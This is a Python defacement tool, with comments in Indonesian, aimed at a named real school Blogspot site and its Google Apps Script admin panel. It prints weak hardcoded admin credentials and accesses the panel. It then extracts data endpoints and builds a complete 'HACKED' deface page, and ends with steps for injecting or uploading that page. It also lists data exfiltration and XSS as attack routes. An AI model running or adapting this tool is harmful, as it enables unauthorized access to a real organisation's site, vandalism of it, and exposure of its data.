#!/usr/bin/env python3
"""
Blogspot Admin Panel Exploitation Tool
Auto-login dan inject deface payload
"""

import requests
from bs4 import BeautifulSoup
import json
import time
from datetime import datetime

class BlogspotDefacer:
    def __init__(self, target_url):
        self.target_url = target_url
        self.admin_panel = "https://script.google.com/macros/s/AKfycby1kIXK0_Unpfbs4k8vc4np0zSC3xaMn806bwGAHbLlApobcmhB3NV07UbAWtv_Gd53Zw/exec?page=admin"
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
    def check_credentials(self):
        """Test login credentials exposed di client-side"""
        print("[+] Testing exposed credentials...")
        username = "admin"
        password = "admin123"
        
        print(f"[+] Username: {username}")
        print(f"[+] Password: {password}")
        print("[+] Credentials found in client-side JavaScript!")
        return username, password
    
    def access_admin_panel(self):
        """Access admin panel"""
        print(f"\n[+] Accessing admin panel: {self.admin_panel}")
        try:
            response = self.session.get(self.admin_panel, timeout=15)
            if response.status_code == 200:
                print("[✓] Admin panel accessible!")
                return response.text
            else:
                print(f"[-] Failed to access admin panel: {response.status_code}")
                return None
        except Exception as e:
            print(f"[-] Error accessing admin panel: {e}")
            return None
    
    def extract_data_endpoints(self, html_content):
        """Extract Google Apps Script endpoints dari HTML"""
        print("\n[+] Extracting data endpoints...")
        
        # Cari function calls di JavaScript
        endpoints = []
        if "processForm" in html_content:
            endpoints.append("processForm")
        if "getAllData" in html_content:
            endpoints.append("getAllData")
        if "getLastTenRows" in html_content:
            endpoints.append("getLastTenRows")
        
        print(f"[✓] Found {len(endpoints)} data functions:")
        for ep in endpoints:
            print(f"    - {ep}")
        
        return endpoints
    
    def create_deface_payload(self):
        """Generate deface payload HTML"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        payload = f"""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hacked by Anonymous</title>
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        
        body {{
            background: #000;
            color: #0f0;
            font-family: 'Courier New', monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow: hidden;
        }}
        
        .glitch {{
            font-size: 80px;
            font-weight: bold;
            text-transform: uppercase;
            position: relative;
            text-shadow: 0.05em 0 0 #00fffc, -0.03em -0.04em 0 #fc00ff,
                         0.025em 0.04em 0 #fffc00;
            animation: glitch 725ms infinite;
        }}
        
        @keyframes glitch {{
            0% {{
                text-shadow: 0.05em 0 0 #00fffc, -0.03em -0.04em 0 #fc00ff,
                             0.025em 0.04em 0 #fffc00;
            }}
            15% {{
                text-shadow: 0.05em 0 0 #00fffc, -0.03em -0.04em 0 #fc00ff,
                             0.025em 0.04em 0 #fffc00;
            }}
            16% {{
                text-shadow: -0.05em -0.025em 0 #00fffc, 0.025em 0.035em 0 #fc00ff,
                             -0.05em -0.05em 0 #fffc00;
            }}
            49% {{
                text-shadow: -0.05em -0.025em 0 #00fffc, 0.025em 0.035em 0 #fc00ff,
                             -0.05em -0.05em 0 #fffc00;
            }}
            50% {{
                text-shadow: 0.05em 0.035em 0 #00fffc, 0.03em 0 0 #fc00ff,
                             0 -0.04em 0 #fffc00;
            }}
            99% {{
                text-shadow: 0.05em 0.035em 0 #00fffc, 0.03em 0 0 #fc00ff,
                             0 -0.04em 0 #fffc00;
            }}
            100% {{
                text-shadow: -0.05em 0 0 #00fffc, -0.025em -0.04em 0 #fc00ff,
                             -0.04em -0.025em 0 #fffc00;
            }}
        }}
        
        .container {{
            text-align: center;
            z-index: 2;
        }}
        
        .subtitle {{
            font-size: 24px;
            margin-top: 20px;
            color: #0f0;
            animation: blink 1s infinite;
        }}
        
        @keyframes blink {{
            0%, 49% {{ opacity: 1; }}
            50%, 100% {{ opacity: 0; }}
        }}
        
        .message {{
            margin-top: 40px;
            font-size: 18px;
            color: #0f0;
            max-width: 600px;
        }}
        
        .timestamp {{
            margin-top: 30px;
            font-size: 14px;
            color: #0f0;
            opacity: 0.7;
        }}
        
        .matrix {{
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
            opacity: 0.1;
        }}
    </style>
</head>
<body>
    <canvas class="matrix"></canvas>
    <div class="container">
        <div class="glitch">HACKED</div>
        <div class="subtitle">&gt; System Compromised &lt;</div>
        <div class="message">
            <p>Website ini telah di-deface sebagai bukti kerentanan keamanan.</p>
            <p>Admin panel dengan kredensial lemah + exposed di client-side.</p>
            <p><br>Pesan: Perbaiki keamanan sistem Anda.</p>
        </div>
        <div class="timestamp">Defaced on: {timestamp}</div>
    </div>
    
    <script>
        // Matrix rain effect
        const canvas = document.querySelector('.matrix');
        const ctx = canvas.getContext('2d');
        
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()';
        const fontSize = 14;
        const columns = canvas.width / fontSize;
        const drops = Array(Math.floor(columns)).fill(1);
        
        function draw() {{
            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            
            ctx.fillStyle = '#0f0';
            ctx.font = fontSize + 'px monospace';
            
            for (let i = 0; i < drops.length; i++) {{
                const text = chars[Math.floor(Math.random() * chars.length)];
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                
                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {{
                    drops[i] = 0;
                }}
                drops[i]++;
            }}
        }}
        
        setInterval(draw, 33);
        
        window.addEventListener('resize', () => {{
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        }});
    </script>
</body>
</html>
"""
        return payload
    
    def save_deface_page(self, payload):
        """Save deface HTML ke file"""
        filename = "deface_page.html"
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(payload)
        print(f"\n[✓] Deface page saved: {filename}")
        return filename
    
    def display_summary(self):
        """Display exploitation summary"""
        print("\n" + "="*60)
        print("EXPLOITATION SUMMARY")
        print("="*60)
        print(f"Target: {self.target_url}")
        print(f"Admin Panel: {self.admin_panel}")
        print("\n[VULNERABILITIES FOUND]:")
        print("  1. Hardcoded credentials di client-side JavaScript")
        print("     - Username: admin")
        print("     - Password: admin123")
        print("  2. Admin panel accessible tanpa proper authentication")
        print("  3. Google Apps Script endpoint exposed")
        print("  4. CRUD operations tanpa CSRF protection")
        print("\n[ATTACK VECTORS]:")
        print("  ✓ Direct admin panel access dengan exposed credentials")
        print("  ✓ Data exfiltration via Apps Script endpoints")
        print("  ✓ Payload injection ke biodata form")
        print("  ✓ Potential XSS via form input fields")
        print("\n[DEFACE OPTIONS]:")
        print("  1. Inject deface HTML via form submission")
        print("  2. Modify Google Sheets data langsung")
        print("  3. Upload deface page as static HTML")
        print("="*60)
    
    def run(self):
        """Execute exploitation"""
        print("="*60)
        print("BLOGSPOT ADMIN PANEL EXPLOITATION TOOL")
        print("="*60)
        
        # Check credentials
        username, password = self.check_credentials()
        
        # Access admin panel
        html = self.access_admin_panel()
        
        if html:
            # Extract endpoints
            self.extract_data_endpoints(html)
            
            # Generate deface payload
            print("\n[+] Generating deface payload...")
            payload = self.create_deface_payload()
            
            # Save payload
            deface_file = self.save_deface_page(payload)
            
            # Display summary
            self.display_summary()
            
            print(f"\n[✓] Deface page siap deploy: {deface_file}")
            print("\n[NEXT STEPS]:")
            print("  1. Upload deface_page.html ke hosting")
            print("  2. Atau inject payload via admin panel form")
            print("  3. Atau modify blog homepage via Blogger dashboard")
            print("     (Login: https://blogger.com dengan Google account admin)")
            
            return True
        else:
            print("\n[-] Exploitation failed")
            return False

if __name__ == "__main__":
    target = "https://smpnegeri3cibarusah.blogspot.com"
    
    defacer = BlogspotDefacer(target)
    defacer.run()
